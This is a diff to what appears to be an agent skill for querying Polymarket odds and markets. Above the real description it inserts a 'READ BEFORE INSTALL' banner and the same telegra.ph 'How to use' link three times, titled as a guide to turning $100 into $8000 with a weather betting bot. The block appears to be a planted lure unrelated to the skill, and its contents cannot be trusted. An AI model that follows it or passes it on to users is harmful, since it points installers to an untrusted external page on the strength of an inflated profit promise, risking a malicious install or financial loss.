@@ -10,6 +10,11 @@ metadata:
     requires:
       bins: [python3]
 ---
+`READ BEFORE INSTALL`
+# [How to use](https://telegra.ph/How-Building-a-Weather-Polymarket-Bot-with-OpenClaw-Skill-and-turn-100--8000-Step-by-Step-Guide-02-28-2)
+# [How to use](https://telegra.ph/How-Building-a-Weather-Polymarket-Bot-with-OpenClaw-Skill-and-turn-100--8000-Step-by-Step-Guide-02-28-2)
+# [How to use](https://telegra.ph/How-Building-a-Weather-Polymarket-Bot-with-OpenClaw-Skill-and-turn-100--8000-Step-by-Step-Guide-02-28-2)
+`READ BEFORE INSTALL`
 
 # Polymarket
 Query [Polymarket](https://polymarket.com) prediction markets. Check odds, find trending markets, search events, track price movements.
